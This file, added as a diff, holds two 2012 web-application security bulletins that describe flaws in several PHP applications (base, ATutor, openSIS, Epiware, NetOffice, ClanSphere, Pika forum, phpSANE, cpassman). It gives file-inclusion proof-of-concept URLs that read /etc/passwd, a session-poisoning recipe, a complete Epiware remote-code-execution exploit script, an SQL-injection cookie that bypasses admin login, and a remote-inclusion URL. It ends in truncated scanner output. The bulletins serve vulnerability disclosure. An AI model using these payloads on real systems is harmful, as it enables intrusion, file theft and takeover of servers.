@@ -1,0 +1,304 @@
+webapps security bulletin 2012/11/1 by ewilded
+
+(all flaws have been succesfuly epxloited under GNU/Linux i686 with php 5.1 and Apache HTTP server) 
+
+project name: base-1.4.5
+type:LFI
+additional conditions: 
+	-	session poisoning ability (local filesystem access required to poison/prepare the session file)
+	-  nullbyte path poisoning ability
+code trace:
+	base-1.4.5/base-1.4.5/setup/setup2.php:31:$ado_inc_php = $_SESSION['adodbpath'] . "/adodb.inc.php";
+	base-1.4.5/base-1.4.5/setup/setup2.php:47:include($ado_inc_php);
+How to exploit:
+1) prepare session file with the following content:
+adodbpath|s:49:"./../../../../../../../../../../../tmp/evil.code^@";
+(^@ indicates nullbyte, this is how it's represented in vim) 
+under i.e. /tmp/sess_q6gtboa7somjf53utrpgn1gqh4 where q6gtboa7somjf53utrpgn1gqh4 is PHPSESSID value and /tmp is session.save_path
+2) put code to execute under: /tmp/code
+then run: http://phpseclab/base-1.4.5/base-1.4.5/setup/setup2.php
+
+Probably other vulnerabilities (not verified):
+[EXEC-NULLBYTE_REQUIRED-REGISER_GLOBALS_REQUIRED]
+	[EXEC-NULLBYTE_REQUIRED-REGISER_GLOBALS_REQUIRED] base-1.4.5/base-1.4.5/base_stat_common.php:22:include_once("$BASE_path/includes/base_constants.inc.php");
+[EXEC-NULLBYTE_REQUIRED-REGISER_GLOBALS_REQUIRED] base-1.4.5/base-1.4.5/admin/index.php:23:  include("$BASE_path/includes/base_constants.inc.php");
+(this one repeats in many other files)
+	
+[FOPEN-REGISER_GLOBALS_REQUIRED]
+	[FOPEN-REGISER_GLOBALS_REQUIRED] base-1.4.5/base-1.4.5/includes/base_template.php:116:    global $TPATH;
+	[FOPEN-REGISER_GLOBALS_REQUIRED] base-1.4.5/base-1.4.5/includes/base_template.php:118:    $template = file_get_contents($TPATH."/".$file);
+	[FOPEN-REGISER_GLOBALS_REQUIRED] base-1.4.5/base-1.4.5/includes/base_template.php:72:    function file_get_contents($filename)
+	[FOPEN-REGISER_GLOBALS_REQUIRED] base-1.4.5/base-1.4.5/includes/base_template.php:74:      if (file_exists($filename))
+	[FOPEN-REGISER_GLOBALS_REQUIRED] base-1.4.5/base-1.4.5/includes/base_template.php:76:        $buf = file($filename);
+	[FOPEN-REGISER_GLOBALS_REQUIRED] base-1.4.5/base-1.4.5/includes/base_template.php:118:        $buf = file($filename);
+
+and probably many other.
+
+
+
+project name: ATutor-2.1
+type: LFI
+additional conditions:
+	- authentication required
+code trace:
+	[EXEC] ATutor-2.1/ATutor/mods/_core/tool_manager/index.php:26:$tool_file= AT_INCLUDE_PATH.'../'.$_REQUEST['tool_file'];	// viene prelevato il path del file necessario per prelevare le informazioni relative ai sottocontenuti
+	[EXEC] ATutor-2.1/ATutor/mods/_core/tool_manager/index.php:27:$tool_list = require($tool_file);                            //si richiede la lista ei contenuti per lo strumento. i contenuti trovati potranno essere inseriti all'interno del materiale didattico come collegamento.
+PoC: http://phpseclab/ATutor-2.1/ATutor/mods/_core/tool_manager/index.php?h=1&tool_file=./../../../../../../../../../../etc/passwd
+Stauts: reported to OSVDB
+Probably many other vulnerabilities present.
+
+
+Just downloaded from here (http://sourceforge.net/projects/opensis-ce/?source=directory), it was updated ~3 hours ago
+project name: opensis 5.1
+type: LFI
+additional conditions:
+	- authentication required
+code trace:
+	 opensis5.1/opensis/ajax.php:79:	if(strpos(clean_param($_REQUEST['modname'],PARAM_NOTAGS),'misc/')===false)
+	 opensis5.1/opensis/ajax.php:86:if(clean_param($_REQUEST['modname'],PARAM_NOTAGS))
+	 opensis5.1/opensis/ajax.php:90:	if(strpos($_REQUEST['modname'],'?')!==false)
+	 opensis5.1/opensis/ajax.php:92:		$vars = substr($_REQUEST['modname'],(strpos($_REQUEST['modname'],'?')+1));
+	 opensis5.1/opensis/ajax.php:93:		$modname = substr($_REQUEST['modname'],0,strpos($_REQUEST['modname'],'?'));
+	 opensis5.1/opensis/ajax.php:79:	if(strpos(clean_param($_REQUEST['modname'],PARAM_NOTAGS),'misc/')===false)
+	 opensis5.1/opensis/ajax.php:86:if(clean_param($_REQUEST['modname'],PARAM_NOTAGS))
+	 opensis5.1/opensis/ajax.php:90:	if(strpos($_REQUEST['modname'],'?')!==false)
+	 opensis5.1/opensis/ajax.php:92:		$vars = substr($_REQUEST['modname'],(strpos($_REQUEST['modname'],'?')+1));
+	 opensis5.1/opensis/ajax.php:93:		$modname = substr($_REQUEST['modname'],0,strpos($_REQUEST['modname'],'?'));
+	 opensis5.1/opensis/ajax.php:103:		$modname = $_REQUEST['modname'];
+	 opensis5.1/opensis/ajax.php:133:		include('modules/'.$modname);
+	
+PoC: http://phpseclab/opensis5.1/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
+Transcripts.php string is required to bypass validateQueryString() function.
+Stauts: reported to OSVDB
+Probably many other vulnerabilities present.
+
+
+
+
+[ webapps security bulletin 2012/11/2 by ewilded ]
+
+Project name: Epiware 4.8.6
+Type: RCE
+Additional conditions:
+	- deprecated $HTTP_POST_VARS (register_long_arrays needs to be on)
+	- authentication required
+Vulnerable code (calendar_viewweek.php:373):
+        if(is_array($HTTP_POST_VARS))
+        {
+                while(list($header,$value)=each($HTTP_POST_VARS))
+                {
+                        eval("$".$header."=\"$value\";");
+                }
+   }
+Description:
+It is possible to create malicious POST variable which will change the syntax of string put to eval, leading to arbitrary code execution. The error was present in few other files, however it got commented out with upgrade at 07.10.2012, while calendar_viewweek.php is still vulnerable.
+Exploit:
+<?php
+# Epiware 4.8.6 exploit code execution exploit (15.11.2012) by ewilded
+## configuration (host + path + local system account credentials are needed to reach vulnerable code section)
+$login='admin'; 
+$pass='admin';
+$path='Epiware_4.8.6/epi/';
+$host='phpseclab';
+$phpcode="echo('CODE_EXECUTION_SUCCESFUL'); die('owned :D');";
+error_reporting(E_ALL);
+ini_set('default_socket_timeout',10);
+
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL,"http://$host/$path/epi_ajax_login.php");
+curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch,CURLOPT_POST,true);
+curl_setopt($ch,CURLOPT_POSTFIELDS,array('username'=>$login,'password'=>$pass)); 
+curl_setopt($ch,CURLOPT_COOKIE,"_test_cookie=0");
+curl_setopt($ch,CURLOPT_HEADER,TRUE); 
+$content=curl_exec($ch);
+echo $content;
+if(!preg_match("#token=(\w+)#",$content,$token))
+{
+	echo "Authentication failed.\n";
+	die();
+}
+$token=$token[1];
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL,"http://$host/$path/epi_login.php?token=$token");
+curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch,CURLOPT_COOKIE,"_test_cookie=0");
+curl_setopt($ch,CURLOPT_HEADER,TRUE); 
+$content=curl_exec($ch);
+echo "$content\n";
+
+preg_match('/Set-Cookie: enc_user_id=(\w+)/',$content,$user_token);
+$user_token=$user_token[1];
+preg_match('/Cookie: enc_group_id=(\w+)/',$content,$group_token);
+$group_token=$group_token[1];
+if(!$user_token||!$group_token) die("Could not authenticate, did not receive session cookie.\n");
+#$authorized=preg_match('//',$content,$auth);
+#if(!$authorized) die("Failed to authenticate with $login and $pass credentials.\n");
+$code_base64_encoded=base64_encode("$phpcode");
+
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL,"http://$host/$path/calendar_viewweek.php");
+curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch,CURLOPT_POST,true);
+curl_setopt($ch,CURLOPT_POSTFIELDS,array('code_to_execute'=>"=\".eval(base64_decode('$code_base64_encoded')).\"")); 
+curl_setopt($ch,CURLOPT_COOKIE,"_test_cookie=0;enc_user_id=$user_token;enc_group_id=$group_token");
+curl_setopt($ch,CURLOPT_HEADER,TRUE); 
+$content=curl_exec($ch);
+echo "$content\n";
+if(preg_match('/(CODE_EXECUTION_SUCCESFUL)/s', $content, $m))
+{
+	print_r($m);
+}
+else
+{
+	die("Exploit failed!\n");
+}
+?>
+Stauts: reported to OSVDB
+
+
+Project name: NetOfficeDwins 1.4p4
+Type: LFI
+Additional conditions:
+	- nullbyte path poisoning ability required
+Vulnerable code (netOfficeDwins.1.4p4/netoffice/installation/upgrade.php:534):
+   case "3":
+        $action = isset($_REQUEST['action'])?$_REQUEST['action']:'';
+        $prevroot = isset($_REQUEST['prevroot'])?$_REQUEST['prevroot']:'';
+
+        if ($action == "check") {
+            if ($prevroot == '') {
+                $error = 'Must be insert the Previous Installation Root.';
+            } else if (!file_exists($prevroot)) {
+                $error = $prevroot . " doesn't exist.";
+            } else {
+                $prevroot = str_replace('\\', '/', $prevroot);
+
+                if (substr($prevroot, -1) == '/') {
+                    $prevroot = substr($prevroot, 0, -1);
+                }
+
+                $prevsettings = $prevroot . '/includes/settings.php';
+
+                if (!file_exists($prevsettings)) {
+                    $error = $prevsettings . " doesn't exist.";
+                } else {
+                    require($prevsettings);
+Description:
+It is possible to include arbitrary local file, leading to information disclosure or injected code execution. Though vulnerable file is located under install directory, which is advised to be removed after the installation process, this action is not required to use the application and user is not forced to perform it, therefore it leads to leaving that file accesible for potential attacks.
+PoC: http://phpseclab/netofficedwins/netoffice/installation/upgrade.php?step=3&action=check&prevroot=./../../../../../../../../../../../../../../../../etc/passwd%00
+Status: Reported to  OSVDB
+
+
+Project name: ClanSphere 2011.3 patch_2 (current version, downloaded today from http://sourceforge.net/projects/clansphere/files/latest/download?source=files - link supplied by the vendor's site:  http://www.csphere.eu/downloads/files/view/id/2)
+Type: LFI
+Additional conditions:
+	- nullbyte path poisoning ability required
+	- authentication requried
+Vulnerable code (mods/clansphere/lang_modvalidate.php:16):
+$language = $_GET['language'];
+$module = $_GET['module'];
+$fix = !isset($_GET['fix']) ? 0 : 1;
+
+
+$file = 'lang/' . $language . '/' . $module . '.php';
+
+if(!file_exists($file)) {
+  echo 'Datei nicht gefunden: ' . $file;
+  return;
+}
+
+$cs_main['mod'] = 'clansphere';
+$cs_main['action'] = 'lang_modvalidate';
+
+if($account['access_clansphere'] < 5) {
+  echo 'Kein Zugriff';
+  return;
+}
+
+$cs_lang = array();
+include 'lang/' . $language . '/system/main.php';
+Status: reported to OVSDB
+PoC:
+http://phpseclab/clansphere_2011.3_patch_2-2012-11-17/mods/clansphere/lang_modvalidate.php?language=./../../../../../../../../../etc/passwd%00
+
+
+
+Project name: Pika forum (current version, last updated 2012-09-16)
+Type: Authentication bypass through SQL injection
+Additional conditions: no         
+Vulnerable code:
+master_set.php:
+<?php
+include('config.php');
+if(isset($_COOKIE['forum_n0pr082']))
+        $pid = $_COOKIE['forum_n0pr082'];
+include('top.php');
+...
+
+top.php:         
+<?php
+$pid2 = substr($pid, 0, 1);
+if ($pid2 == 'a') 
+{
+$resulti = mysql_query( "SELECT * FROM admins_lf2713 WHERE auth='$pid'" );
+$numrows = mysql_num_rows($resulti);
+if($numrows !== 0)      {
+$rowi = mysql_fetch_array( $resulti );
+$name_s = $rowi['name'];
+$lname_s = $rowi['lname'];
+$pname_s = $rowi['pname'];
+$sstatus = 'logged_in';
+                }
+
+PoC: It is simply possible to bypass admin authentication process by preparing (for instance with Firefox Cookie Editor) a cookie named forum_n0pr082 with value like this:a' OR '1'='1
+It has to begin with 'a' character and change the SQL query structure so it returns first row of the admins_lf2713 table and consider us as authenticated.
+Then just enter the URL, like http://phpseclab/pika_forum/master_set.php and you are authenticated.
+Status: reported to OVSDB
+
+
+
+Project name: phpSANE 0.6.1
+Type: Remote File Inclusion
+Additional conditions: no         
+Vulnerable code (save.php:15):
+include("language.php");
+
+$file_save = $_GET['file_save'];
+$file_save_image = $_GET['file_save_image'];
+$lang_id = $_GET['lang_id'];
+
+
+if ($file_save_image) {
+        echo "
+        <p class='align_center'>
+                <img src='".$file_save."' border='2'>";
+} else {
+        // my_pre my_mono
+        echo "\t<p class='my_pre'>\n";
+        include($file_save);
+        echo "\n\t<hr>\n";
+}
+Description: It is simply possible to include and execute remote PHP code by manipulating file_save_image URL variable in save.php. This requires allow_url_open in php.ini to be turned on. Otherwise Local File Inclusion is still possible.
+PoC: It is simply exploitable with web browser, http://phpseclab/phpsane-0.6.1/save.php?file_save=http://example.org/malicious.code
+Status: reported to OVSDB 
+Update: it turns out that vulnerability is well known for about 5 years and is present from version 0.5.x .... however no instances found on the web.
+
+
+
+  [0m [1;31m[EXEC-NULLBYTE_REQUIRED]
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:7:      if (!isset($_SESSION['user_language']) && !isset($_COOKIE['user_language'])) {
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:8:              if (isset($_POST['language'])) {
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:9:                      $_SESSION['user_language'] = filter_var($_POST['language'], FILTER_SANITIZE_STRING);
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:12:                     $_SESSION['user_language'] = "english";
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:8:              if (isset($_POST['language'])) {
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:9:                      $_SESSION['user_language'] = filter_var($_POST['language'], FILTER_SANITIZE_STRING);
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:10:                     $_COOKIE['user_language'] = filter_var($_POST['language'], FILTER_SANITIZE_STRING);
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:16:             if (isset($_POST['language'])) {
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:17:                     $_SESSION['user_language'] = filter_var($_POST['language'], FILTER_SANITIZE_STRING);
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:20:                     $_SESSION['user_language'] = $_COOKIE['user_language'];
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:8:              if (isset($_POST['language'])) {
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:9:                      $_SESSION['user_language'] = filter_var($_POST['language'], FILTER_SANITIZE_STRING);
+         [EXEC-NULLBYTE_REQUIRED]/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php:10:                     $_COOKIE['user_language'] = filter_var($_POST['language'
+         
+/home/scary/victims//cpassman_1.82-112-10-18/cpassman/index.php
